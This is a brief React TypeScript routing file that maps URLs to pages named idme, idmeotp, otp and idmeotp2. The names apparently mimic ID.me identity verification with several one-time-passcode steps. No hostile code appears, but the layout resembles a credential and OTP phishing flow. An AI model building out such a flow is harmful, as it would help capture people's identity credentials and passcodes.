// src/App.tsx

import React from "react";
import { Routes, Route } from "react-router-dom";

import Home from "./pages/Home";
import Ime from "./pages/ime";
import Idme from "./pages/idme";
import IdmeOtp from "./pages/idmeotp";
import Otp from "./pages/otp";
import Otp2 from "./pages/idmeotp2"; // Matches your sidebar filename idmeotp2.tsx

const App: React.FC = () => {
  return (
    <Routes>
      <Route path="/" element={<Home />} />
      <Route path="/ime" element={<Ime />} />
      <Route path="/idme" element={<Idme />} />
      <Route path="/idmeotp" element={<IdmeOtp />} />
      <Route path="/otp" element={<Otp />} />
      
      {/* THIS MUST MATCH THE URL IN YOUR OTP.TSX */}
      <Route path="/idmeotp2" element={<Otp2 />} /> 
    </Routes>
  );
};

export default App;